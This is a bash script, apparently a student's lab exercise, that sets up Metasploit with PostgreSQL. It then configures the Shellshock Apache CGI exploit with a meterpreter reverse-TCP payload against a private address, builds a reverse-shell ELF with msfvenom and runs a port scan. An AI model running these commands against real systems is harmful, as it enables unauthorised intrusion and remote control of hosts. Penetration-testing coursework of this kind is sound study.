#!/bin/bash
# Metasploit Workflow Script for Holberton School
# Student: GermÃ¡n Silveira

echo "=== PART 1: Setup Metasploit with PostgreSQL ==="

# Install PostgreSQL
echo "1. Installing PostgreSQL..."
sudo apt update > /dev/null 2>&1
sudo apt install -y postgresql postgresql-contrib > /dev/null 2>&1

# Start PostgreSQL Service
echo "2. Starting PostgreSQL service..."
sudo systemctl start postgresql > /dev/null 2>&1
sudo systemctl enable postgresql > /dev/null 2>&1

# Create PostgreSQL User
echo "3. Creating PostgreSQL user for Metasploit..."
sudo -u postgres psql -c "CREATE USER msf_user WITH PASSWORD 'holberton_2024' CREATEDB;" > /dev/null 2>&1

# Create PostgreSQL Database
echo "4. Creating PostgreSQL database for Metasploit..."
sudo -u postgres psql -c "CREATE DATABASE msf_database OWNER msf_user;" > /dev/null 2>&1
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE msf_database TO msf_user;" > /dev/null 2>&1

# Initialize Metasploit Database
echo "5. Initializing Metasploit database..."
msfdb init > /dev/null 2>&1

# Verify Database Connection
echo "6. Verifying database connection..."
msfconsole -q -x "db_status; exit" > /dev/null 2>&1

echo "=== PART 2: Basic Usage of Metasploit ==="

# Start Metasploit and document workflow
echo "7. Starting Metasploit workflow documentation..."
msfconsole -q -x "
# Search for exploits
search type:exploit platform:linux name:apache

# Select an exploit
use exploit/linux/http/apache_mod_cgi_bash_env_exec

# Set exploit options
set RHOSTS 192.168.1.100
set TARGETURI /cgi-bin/test.cgi

# Set payload
set payload linux/x64/meterpreter/reverse_tcp

# Set local host and port
set LHOST 192.168.1.50
set LPORT 4444

# Show options
show options

# Run notes command for documentation
notes -t csv

# Exit Metasploit
exit
"

echo "=== PART 3: Create and Use a Simple Payload ==="

# Generate payload with msfvenom
echo "8. Generating payload with msfvenom..."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf

echo "9. Payload generated: payload.elf"

echo "=== PART 4: Explore Auxiliary Modules ==="

# Explore auxiliary modules
msfconsole -q -x "
# Search for auxiliary modules
search type:auxiliary name:scanner

# Select auxiliary module
use auxiliary/scanner/portscan/tcp

# Configure module options
set RHOSTS 192.168.1.100
set PORTS 1-1000

# Show options
show options

# Run notes and loot commands for documentation
notes -t csv
loot -t csv

# Exit Metasploit
exit
"

echo "=== PART 5: Documentation and Reporting ==="
echo "10. Documentation completed. Check notes.csv and loot data."

echo "=== Metasploit Workflow Completed ==="
